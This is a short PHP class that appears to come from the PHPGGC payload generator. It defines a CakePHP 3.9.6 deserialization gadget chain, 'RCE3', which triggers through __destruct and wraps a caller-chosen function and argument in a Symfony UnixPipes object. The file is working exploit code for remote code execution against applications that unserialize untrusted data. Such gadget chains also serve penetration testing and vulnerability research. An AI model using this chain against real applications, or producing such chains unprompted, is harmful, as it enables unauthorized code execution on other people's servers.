<?php

namespace GadgetChain\CakePHP;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.9.6';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Symfony\Component\Process\Pipes\UnixPipes($function, $parameter);
    }
}